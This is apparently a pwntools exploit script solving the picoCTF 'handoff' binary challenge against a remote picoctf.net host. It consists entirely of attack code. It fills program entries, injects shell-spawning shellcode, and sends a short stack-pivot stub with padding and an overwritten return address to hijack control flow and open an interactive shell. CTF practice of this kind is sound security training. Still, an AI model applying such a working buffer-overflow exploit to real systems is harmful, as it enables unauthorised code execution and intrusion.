from pwn import *
exe = context.binary = ELF("./handoff")
r = process()
r = remote("shape-facility.picoctf.net",63993)
rop = ROP(exe)
offset = 20
for i in range(10):
    r.sendline("1")
    r.sendline(b"\x90" * 8)

r.sendline("2")
r.sendline("8")
r.sendline(b"\x90" * 63)
r.sendline("2")
r.sendline("9")
r.sendline(asm(shellcraft.sh()))
shellcode = b"\x48\x83\xec\x68\xff\xe4"
payload = shellcode + b"\x90" * 14 + p64(0x000000000040116c)
print(r.recv(9999))
r.sendline("3")
time.sleep(20)
r.sendline(payload)
r.interactive()
